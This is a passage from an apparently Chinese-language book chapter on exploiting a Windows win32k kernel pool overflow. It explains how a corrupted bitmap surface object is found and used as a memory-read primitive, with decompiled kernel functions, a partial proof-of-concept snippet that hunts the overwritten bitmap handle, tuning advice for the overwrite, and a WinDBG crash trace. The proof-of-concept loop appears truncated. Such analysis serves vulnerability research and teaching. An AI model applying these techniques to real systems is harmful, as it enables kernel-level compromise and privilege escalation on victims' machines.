`SURFACE->so.sizlBitmap` 成员域，而没有校验 `SURFACE->so.cjBits` 代表像素点总字节数的成员域的值。
随后函数 `win32k!NtGdiGetBitmapBits` 根据返回的数值判断是否需要更新传入的请求字节数参数的数值。在接下来第二次调用
`GreGetBitmapBits` 函数时，传入实际的请求字节数和缓冲区指针，函数得以向后执行。
      if ( v4 )
      {
        lInitOffset = *pOffset;
        if ( *pOffset = v4 )
          goto LABEL_30;
        if ( cjTotal + lInitOffset > v4 )
          cjTotal = v4 - lInitOffset;
        if ( cjTotal )
        {
          v17 = cjTotal;
          v18 = pjBuffer;
          v9 = 0;
          v20 = lInitOffset;
          if ( pSurf )
            v9 = pSurf + 0x10;
          bDoGetSetBitmapBits((struct _SURFOBJ *)&v11, (struct _SURFOBJ *)v9, 1);
          v4 = v17;
          *pOffset = v17 + lInitOffset;
        }
        else
        {
    LABEL_30:
          v4 = 0;
        }
      }
清单 5-24 函数 GreGetBitmapBits 代码片段
随后函数调用 `bDoGetSetBitmapBits` 函数执行获取位图像素点数据的具体操作。函数 `bDoGetSetBitmapBits`
具有三个参数：参数 `SURFOBJ *a1` 指示主控位图 `SURFOBJ` 对象指针，参数 `SURFOBJ *a2` 指示源位图 `SURFOBJ`
对象指针。参数 `a3` 是 `BOOL` 类型的数值，用于表示本次操作是获取还是写入像素点数据。
当参数 `a3` 值为 `1` 时，函数将从 `a2` 指向的 `SURFOBJ` 对象中获取像素点数据并写入 `a1` 参数指向 `SURFOBJ`
对象关联的缓冲区中；当 `a3` 值为 `0` 时，函数将 `a1` 参数指向的 `SURFOBJ` 对象关联的位图数据写入 `a2` 指向
`SURFOBJ` 对象关联的位图中。根据上面的代码片段，当前调用向该参数传递 `1` 表示这次调用是获取操作。
传递给 `bDoGetSetBitmapBits` 函数的第二个参数是当前 `SURFACE` 对象中的 `SURFOBJ so`
成员的地址；而传递的第一个参数的值是变量 `v11` 的地址，这表示在当前函数栈上从 `v11` 变量地址开始存储一个 `SURFOBJ`
临时对象，在函数稍早位置对这个临时对象的各个成员域进行了初始化。根据偏移计算，变量 `v17` 是 `SURFOBJ` 临时对象中的 `cjBits`
成员。在函数中调用 `bDoGetSetBitmapBits` 函数之前，计算得到的用于指示实际请求字节数的 `cjTotal`
变量的值以及从用户进程中传入的缓冲区指针 `pjBuffer` 分别被赋给临时 `SURFOBJ` 对象的 `cjBits` 和 `pvBits`
成员，并且在函数调用返回后成员 `cjBits` 的值被赋给作为返回值的 `v4` 变量。这样一来临时对象的 `cjBits` 成员必然在
`bDoGetSetBitmapBits` 函数中被更新。
      v3 = a2;
      ...
      v4 = a1;
      if ( *((_DWORD *)a1 + 7) )
      {
        a2 = (struct _SURFOBJ *)*((_DWORD *)a1 + 7);
        a1 = (struct _SURFOBJ *)*((_DWORD *)v3 + 8);
        v22 = *((_DWORD *)v3 + 9);
        v5 = ((_DWORD)(*((_DWORD *)v3 + 4) * gaulConvert[*((_DWORD *)v3 + 0xB)] + 15) >> 3) & 0x1FFFFFFE;
        v6 = v5 * *((_DWORD *)v3 + 5);
        v7 = *((_DWORD *)v4 + 9);
        cjTotal = *((_DWORD *)v4 + 6);
        a3 = *((_DWORD *)v4 + 6);
        if ( (v7 & 0x80000000) != 0 || v7 >= v6 )
        {
          *((_DWORD *)v4 + 6) = 0;
          return 0;
        }
        if ( cjTotal + v7 > v6 )
        {
          cjTotal = v6 - v7;
          a3 = v6 - v7;
        }
        *((_DWORD *)v4 + 6) = cjTotal;
        ...
        while ( 1 )
        {
          v11 = v26--;
          if ( !v11 )
            break;
          memcpy((void *)a2, (const void *)a1, v5);
          a2 = (struct _SURFOBJ *)((char *)a2 + v5);
          a1 = (struct _SURFOBJ *)((char *)a1 + v22);
        }
        if ( v10 )
          memcpy((void *)a2, (const void *)a1, v10);
      }
清单 5-25 函数 bDoGetSetBitmapBits 获取像素点数据的代码片段
在函数 `bDoGetSetBitmapBits` 获取像素点数据的处理逻辑中，存在对主控 `SURFOBJ` 对象的 `cjBits`
成员赋值的语句（见上面的代码片段中的 `(_DWORD *)v4+6` 域的赋值）。总体而言，与前面初次执行 `GreGetBitmapBits`
函数获取位图表面对象的实际像素点数据大小的代码逻辑类似，根据 `iBitmapFormat` 和 `sizlBitmap`
域的值以及引入的外部偏移量的值综合计算出 `cjBits` 的值。
关注上面的内存拷贝循环语句，其中作为拷贝目标的 `a2` 值为位于用户进程地址空间的缓冲区地址，作为拷贝源的 `a1`
值为主控位图表面对象的位图数据区域地址（编译器捣的鬼，进行了变量和参数复用，对可读性造成困扰）。循环期间每次调用 `memcpy`
函数进行数据拷贝时，拷贝的长度为 `v5` 变量的值，理解代码逻辑可知，`v5` 变量的值为即时计算出的当前位图表面对象的位图数据扫描线长度。在调用的
`memcpy`
函数返回之后，对拷贝目标指针和源指针进行后移。可以注意到的是，对目标指针的后移量是即时计算出的当前位图表面对象的位图数据扫描线长度，而对源指针的后移量是存储在
`SURFACE->so.lDelta` 成员中域的数值。
这样一来问题就出现了：存储在 `SURFACE->so.lDelta` 成员域中的数值是在调用 `SURFMEM::bCreateDIB`
函数分配对象时赋值的，它的值是通过位图像素宽度和位图像素位类型的初始值计算出来的，而在当前函数调用时，位图像素宽度
`SURFACE->so.sizlBitmap.cy`
成员域的值早已被漏洞导致的溢出覆盖所污染，位图宽度的值已不再是原值了，这样的话在进行指针后移操作时，源缓冲区和目标缓冲区指针的后移量将不相同，导致最终写入用户进程缓冲区中的数据存在偏差。成员
`iBitmapFormat` 由于比较靠后所以未被溢出覆盖所触及会保持不变，则要想解决这个问题，就必须确保在漏洞覆盖位图表面对象的数据前后，成员域
`sizlBitmap.cy` 的值保持不变。反观前面的溢出覆盖的 WinDBG 调试数据，该成员域的值被覆盖为
`0x01`，那么在我们的验证代码中创建位图对象时传递的位图像素宽度参数值就必须为
`0x01`，将控制位图大小的职责完全由像素高度参数担负。笔者在这里踩了坑，所以特别提醒读者。
这样一来，通过以下的验证代码片段可从我们创建并保存的大量的位图句柄中定位出被覆盖数据的位图表面对象的句柄：
    pBmpHunted = (PDWORD)malloc(0x1000); // memory stub
    LONG index = -1;
    POCDEBUG_BREAK();
    for (LONG i = 0; i  0x2D0)
        {
            index = i;
            break;
        }
    }
    hbmpmain = hbitmap[index];
清单 5-26 定位被覆盖数据位图表面对象句柄的验证代码片段
上面的验证代码通过循环调用 `GetBitmapBits` 函数遍历位图句柄数组以定位被覆盖数据的位图表面对象的句柄，获取 `0x1000`
字节的一整个内存页大小的位图数据。大部分配有被覆盖数据的位图表面对象的像素点数据区域大小仍旧是原来的 `0xB1*0x01*4=0x2C4`
字节大小，所以返回值只可能是不超过 `0x2C4` 的数值；而针对被我们覆盖数据的主控位图表面对象而言，由于 `sizlBitmap` 成员的值被覆盖成
`0x01` 和 `0xFFFFFFFF` 数值，所以在计算位图像素点数据“实际大小”时，计算出来的结果是
`0x(3)FFFFFFFC`，这是一个发生溢出的数值，高于 `32` 位的数据被舍弃。这样的话，当遍历到主控位图对象的句柄时，函数的返回值将必然是比
`0x2D0` 大的数，因此得以命中。命中成功后 `pBmpHunted` 缓冲区中就存储了从当前位图对象的位图像素点数据区域起始地址开始的
`0x1000` 字节范围的内存数据。
* * *
**访问违例**
然而在环境中实际测试的时候发现了问题，在调用 `GetBitmapBits` 函数期间 WinDBG 捕获到了访问违例的异常：
    Access violation - code c0000005 (!!! second chance !!!)
    win32k!PDEVOBJ::bAllowShareAccess+0x52:
    938e391f 857824          test    dword ptr [eax+24h],edi
    kd> k
     # ChildEBP RetAddr  
    00 95a9bb2c 938f08e1 win32k!PDEVOBJ::bAllowShareAccess+0x52
    01 95a9bb3c 9386208e win32k!NEEDGRELOCK::vLock+0x1b
    02 95a9bbd4 9386650f win32k!GreGetBitmapBits+0xce
    03 95a9bc20 83e891ea win32k!NtGdiGetBitmapBits+0x86
    04 95a9bc20 774170b4 nt!KiFastCallEntry+0x12a
    05 0019f0d0 7630c1d3 ntdll!KiFastSystemCallRet
    06 0019f0d4 011699a0 gdi32!NtGdiGetBitmapBits+0xc
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    07 0019fe70 0116a48a 0x11699a0
    08 0019fec4 011a085e 0x116a48a
    09 0019fed8 011a0760 0x11a085e
    0a 0019ff30 011a060d 0x11a0760
    0b 0019ff38 011a0878 0x11a060d
    0c 0019ff40 75a93c45 0x11a0878
    0d 0019ff4c 774337f5 kernel32!BaseThreadInitThunk+0xe
    0e 0019ff8c 774337c8 ntdll!__RtlUserThreadStart+0x70
    0f 0019ffa4 00000000 ntdll!_RtlUserThreadStart+0x1b
    kd> r eax
    eax=00044ea8
    kd> dc eax+24h l 4
    00044ecc  ???????? ???????? ???????? ????????  ????????????????
清单 5-27 调用 GetBitmapBits 期间发生访问违例异常
根据栈回溯发现是在 `GreGetBitmapBits` 函数中调用 `NEEDGRELOCK::vLock` 函数，然后在其中调用
`PDEVOBJ::bAllowShareAccess` 函数时发生异常的。
在函数 `GreGetBitmapBits` 中存在一处 `NEEDGRELOCK::vLock` 函数的调用：
    v40 = *((_DWORD *)pSurf + 7);
    NEEDGRELOCK::vLock((NEEDGRELOCK *)&v38, (struct PDEVOBJ *)&v40);
将地址作为外部参数传入函数调用的 `v40` 变量存储的是当前表面对象的 `SURFACE->so.hdev`
成员的值，该成员是指向某个设备对象的指针。变量 v4 的地址是作为 `PDEVOBJ` 对象指针传入 `NEEDGRELOCK::vLock`
函数中的，`PDEVOBJ` 类型对象中只含有一个成员变量：指向对应的实际设备对象的指针，与 `SURFACE->so.hdev` 成员域的类型相同。
在 `NEEDGRELOCK::vLock` 函数中，对 `PDEVOBJ` 对象的指针成员的值进行判断，非空的话就调用 `PDEVOBJ` 对象的
`bAllowShareAccess` 成员函数，在其中访问实际设备对象中的数据。
    void __thiscall NEEDGRELOCK::vLock(NEEDGRELOCK *this, struct PDEVOBJ *a2)
    {
      NEEDGRELOCK *v2; // esi@1
      PERESOURCE v3; // ecx@4
      v2 = this;
      *(_DWORD *)this = 0;
      if ( *(_DWORD *)a2 && !PDEVOBJ::bAllowShareAccess(a2) && !(*(_DWORD *)(*(_DWORD *)a2 + 36) & 0x8000) )
      {
        v3 = ghsemGreLock;
        *(_DWORD *)v2 = ghsemGreLock;
        GreAcquireSemaphore(v3);